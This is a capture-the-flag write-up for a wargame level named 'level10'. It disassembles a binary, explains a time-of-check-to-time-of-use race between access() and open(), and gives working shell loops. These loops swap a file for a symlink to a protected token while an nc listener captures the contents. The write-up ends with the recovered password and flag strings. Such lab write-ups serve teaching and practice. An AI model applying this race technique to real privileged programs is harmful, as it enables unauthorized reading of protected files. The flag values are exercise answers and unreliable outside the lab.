Like before, two file, one executable "level10" and one token "token".
level10 ask for a file to read and an address to communicate.

<- objdump -d level10

We can see the use off access function that check if it can read the file followed by a jump  to exit if he's not allowed.

-> 8048749:       e8 92 fe ff ff          call   80485e0 <access@plt>

If the token is readable, it open a connection:

-> 804878f:       e8 5c fe ff ff          call   80485f0 <socket@plt>
-> 80487cb:       e8 30 fe ff ff          call   8048600 <inet_addr@plt>
-> 80487de:       e8 6d fd ff ff          call   8048550 <htons@plt>
-> 8048805:       e8 06 fe ff ff          call   8048610 <connect@plt>

And THEN open the file and read

-> 804889b:       e8 00 fd ff ff          call   80485a0 <open@plt>
-> 80488da:       e8 31 fc ff ff          call   8048510 <read@plt>

This a call for a TOCTOU race (Time of Check to Time of Update).

So we'll try to send both a readable file and our token as close as possible.

A simple script that replace the file by a symbolic link while executing the file will do the work.
Due to the fact that this is really fast, we'll do this in loop.

We need first to listen (we'll use "nc") on wanted socket ("-l 6969" to listen on asked by the level10) and keep listen after each send ("-k"):

<- nc -lk 6969 > /tmp/nyanpasu

On two differend terminal, write these script:

<- while (true) do ~/level10 /tmp/popipo 127.0.0.1 > /dev/null; done
<- while (true) do touch /tmp/popipo; rm /tmp/popipo; ln -s ~/token /tmp/popipo; rm /tmp/popipo; done

Now wait a bit.

...
A moment later
...

stop all the process, and let's check data stored (except ".*( )*.") in /tmp/nyanpasu.

<- cat /tmp/nyanpasu | grep -v ".*( )*."
-> woupa2yuojeeaaed06riuj63c

Yeh !

<- su flag10
<- woupa2yuojeeaaed06riuj63c
-> Don't forget to launch getflag !
<- getflag
-> Check flag.Here is your token : feulo4b72j7edeahuete3no7c
